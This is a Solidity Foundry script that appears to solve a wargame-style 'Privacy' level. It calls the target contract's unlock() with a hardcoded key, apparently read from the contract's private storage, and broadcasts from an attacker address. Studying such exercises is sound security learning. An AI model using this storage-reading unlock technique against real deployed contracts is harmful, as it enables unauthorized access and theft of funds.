// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface IPrivacy {
    function unlock(bytes16 _key) external;
}

contract PrivacyAttacker is Constants, Script {
    bytes32 constant PASSWORD = 0x6cea532d54085cff61a03678e2b030dace7016e07f7013a9dab6c3cbc82e55eb;

    function run() public {
        IPrivacy victim = IPrivacy(PRIVACY_ADDRESS);

        vm.startBroadcast(ATTACKER_ADDRESS);
        attack(victim);
        vm.stopBroadcast();
    }
    
    function attack(IPrivacy victim) private {
        victim.unlock(bytes16(PASSWORD));
    }
}